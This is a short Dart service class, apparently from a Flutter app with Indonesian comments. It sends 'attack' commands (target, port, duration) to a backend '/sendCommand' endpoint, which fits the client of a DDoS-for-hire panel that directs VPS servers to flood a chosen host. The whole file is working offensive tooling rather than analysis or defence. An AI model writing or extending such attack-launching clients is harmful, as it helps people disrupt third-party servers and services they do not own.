// lib/services/vps_service.dart
import 'dart:convert';
import 'package:http/http.dart' as http;
import '../main.dart'; // untuk baseUrl

class VPSService {
  final String sessionKey;

  VPSService({required this.sessionKey});

  /// Mengirim perintah serangan ke endpoint /sendCommand
  /// Parameter method dan vpsHost disertakan untuk kompatibilitas, namun tidak dikirim ke backend
  Future<void> sendAttack({
    required String target,
    required int port,
    required int duration,
    required String method,
    required String vpsHost,
  }) async {
    final uri = Uri.parse("$baseUrl/sendCommand");
    final response = await http.post(
      uri,
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'key': sessionKey,
        'target': target,
        'port': port,
        'duration': duration,
        // method dan vpsHost tidak dikirim karena backend hanya menerima key, target, port, duration
      }),
    );

    if (response.statusCode != 200) {
      throw Exception('Gagal mengirim perintah (HTTP ${response.statusCode})');
    }

    final data = jsonDecode(response.body);
    if (data['success'] != true) {
      throw Exception(data['error'] ?? 'Gagal meluncurkan serangan');
    }
  }
}